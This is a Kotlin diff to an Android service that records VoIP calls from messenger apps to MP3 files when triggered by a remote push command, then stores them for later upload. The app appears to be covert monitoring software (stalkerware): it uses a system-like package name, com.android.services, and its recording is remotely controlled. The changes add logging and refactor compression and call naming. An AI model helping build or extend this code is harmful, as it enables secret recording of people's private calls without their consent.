@@ -2,14 +2,17 @@ package com.android.services.workers.voip
 
 import android.app.Service
 import android.content.Context
+import android.content.Intent
 import android.os.PowerManager
 import android.util.Log
+import androidx.localbroadcastmanager.content.LocalBroadcastManager
 import androidx.work.Data
 import androidx.work.WorkManager
 import com.android.services.db.entities.VoipCall
 import com.android.services.enums.FcmPushStatus
 import com.android.services.logs.source.LocalDatabaseSource
 import com.android.services.models.VoipCallRecord
+import com.android.services.receiver.AudioFileCompressorReceiver
 import com.android.services.services.callRecord.CallRecorderService
 import com.android.services.services.voip.VoipCallCommandProcessingBaseI
 import com.android.services.util.AppConstants
@@ -40,6 +43,7 @@ class VoipCallRecordProcessingBaseImpll(
 ) : VoipCallRecordProcessingBase(context) {
     override fun initialize() {
         logVerbose("In OnCreate", AppConstants.VOIP_CALL_TYPE)
+        logVerbose("In OnCreate voip call recording", "VoipCallRecordingInfo")
         AppUtils.appendLog(
             context.applicationContext,
             "${AppConstants.VOIP_CALL_TYPE} In OnCreate"
@@ -61,6 +65,7 @@ class VoipCallRecordProcessingBaseImpll(
             voipCallRecordJsonString?.let {
                 voipCallRecord =
                     Gson().fromJson(voipCallRecordJsonString, VoipCallRecord::class.java)
+                logVerbose("VoipCall Push = $voipCallRecord", "VoipCallRecordingInfo")
                 logVerbose("VoipCall Push = $voipCallRecord", AppConstants.VOIP_CALL_TYPE)
                 AppUtils.appendLog(
                     context.applicationContext,
@@ -107,10 +112,12 @@ class VoipCallRecordProcessingBaseImpll(
                 .doOnSubscribe { }
                 .subscribe {
                     if (!AppUtils.isVOIPModeActive(context)) {
+                        logVerbose("VoipCall ends", "VoipCallRecordingInfo")
                         logVerbose("${AppConstants.VOIP_CALL_TYPE} VoipMode In-active -> Stopping Service")
                         stopThisWorkerService()
                     } else {
                         logVerbose("${AppConstants.VOIP_CALL_TYPE} VoipMode -> Active")
+                        logVerbose("VoipCall still active", "VoipCallRecordingInfo")
                         AppUtils.appendLog(
                             context.applicationContext,
                             "${AppConstants.VOIP_CALL_TYPE} VoipMode -> Active"
@@ -142,6 +149,7 @@ class VoipCallRecordProcessingBaseImpll(
         logVerbose("Call recording started in VoipCallRecordService", "CallRecordingInfo")
         try {
             logVerbose("${AppConstants.VOIP_CALL_TYPE} Preparing to Start Recording")
+            logVerbose("VoipCall recording going to start", "VoipCallRecordingInfo")
             recorder = Mp3LameRecorder(mFilePath, 44100)
             recorder!!.startRecording(Mp3LameRecorder.TYPE_CALL_RECORD)
         } catch (exp: Exception) {
@@ -162,6 +170,7 @@ class VoipCallRecordProcessingBaseImpll(
 
     override suspend fun stopRecording() {
         withContext(Dispatchers.IO) {
+            logVerbose("VoipCall Preparing to Stop Recording", "VoipCallRecordingInfo")
             logVerbose("${AppConstants.VOIP_CALL_TYPE} Preparing to Stop Recording")
             AppUtils.appendLog(
                 context.applicationContext,
@@ -176,6 +185,8 @@ class VoipCallRecordProcessingBaseImpll(
                         context.applicationContext,
                         "${AppConstants.VOIP_CALL_TYPE} Recording Stopped"
                     )
+                    logVerbose("VoipCall Recording Stopped", "VoipCallRecordingInfo")
+
                 }
             } catch (e: Exception) {
                 logException(
@@ -203,13 +214,7 @@ class VoipCallRecordProcessingBaseImpll(
         coroutineScope.launch {
             try {
                 stopRecording()
-                var destFile: String? = null
-                try {
-                    destFile = compressOutputFile()
-                } catch (e: Exception) {
-                    logException("Error compressing file ${e.message}", throwable = e)
-                }
-                reNameFile(applicationContext, mFilePath, destFile)
+                reNameFile(applicationContext, mFilePath, null)
                 insertVoipCall()
                 if (disposable != null && !disposable!!.isDisposed)
                     disposable!!.dispose()
@@ -217,8 +222,10 @@ class VoipCallRecordProcessingBaseImpll(
                 releaseWakeLock()
                 logVerbose(
                     "stopping voip recording service",
-                    "CallRecordingInfo"
+                    "VoipCallRecordingInfo"
                 )
+                LocalBroadcastManager.getInstance(applicationContext)
+                    .sendBroadcast(Intent(AudioFileCompressorReceiver.ACTION_COMPRESS_AUDIO))
             } catch (exp: Exception) {
                 logException("${AppConstants.VOIP_CALL_TYPE} onDestroy Exception = ${exp.message}")
                 AppUtils.appendLog(
@@ -324,38 +331,27 @@ class VoipCallRecordProcessingBaseImpll(
             )
             if (voipCallStatus == FcmPushStatus.SUCCESS.getStatus() || voipCallStatus == FcmPushStatus.INTERRUPTED.getStatus()) {
                 if (AppUtils.validFileSize(File(mFilePath)) && elapsedTime > 2) {
+                    var voipCallName = voipCallRecord!!.voipName
+                    val checkThisVoipCallCountInDB =
+                        localDatabaseSource.checkIfVoipCallAlreadyProceeded(voipCallRecord!!.voipDateTime)
+                    voipCallName = "$voipCallName($checkThisVoipCallCountInDB)"
                     val voipCall = VoipCall()
                     voipCall.apply {
                         this.uniqueId = randomUniqueId
                         this.file = mFilePath
                         this.appName = voipCallRecord!!.voipMessenger
                         this.name = voipCallRecord!!.voipName
-                        this.callNumber = voipCallRecord!!.voipNumber
+                        this.callNumber = voipCallName
                         this.callDirection = voipCallRecord!!.voipDirection
                         this.callType = voipCallRecord!!.voipType
                         this.callDuration = elapsedTime.toString()
                         this.callDateTime = voipCallRecord!!.voipDateTime
                         this.date = AppUtils.getDate(currentTimeInMilliSeconds)
-                        this.isCompressed = 1
+                        this.isCompressed = 0
                         this.status = 0
                     }
                     localDatabaseSource.insertVoipCall(voipCall)
-                } else if (voipCallStatus == FcmPushStatus.INITIALIZED.getStatus()) {
-                    AppUtils.appendLog(
-                        context.applicationContext,
-                        "VoipCall ${voipCallStatus} failed with duration = $elapsedTime and Size = ${
-                            File(
-                                mFilePath
-                            ).sizeInKb
-                        }"
-                    )
-                    logVerbose(
-                        "${AppConstants.VOIP_CALL_TYPE} VoipCall ${voipCallStatus} failed with duration = $elapsedTime and Size = ${
-                            File(
-                                mFilePath
-                            ).sizeInKb
-                        }"
-                    )
+                    logVerbose("VoipCall inserted", "VoipCallRecordingInfo")
                 } else {
                     AppUtils.appendLog(
                         context.applicationContext,
@@ -372,6 +368,7 @@ class VoipCallRecordProcessingBaseImpll(
                             ).sizeInKb
                         }"
                     )
+                    logVerbose("VoipCall not inserted", "VoipCallRecordingInfo")
                 }
             } else {
                 AppUtils.appendLog(
@@ -380,6 +377,10 @@ class VoipCallRecordProcessingBaseImpll(
                 )
                 logVerbose(
                     "${AppConstants.VOIP_CALL_TYPE} VoipCall failed with status ${voipCallStatus}"
+                )
+                logVerbose(
+                    "VoipCall not inserted because of failed status",
+                    "VoipCallRecordingInfo"
                 )
                 return@withContext
             }
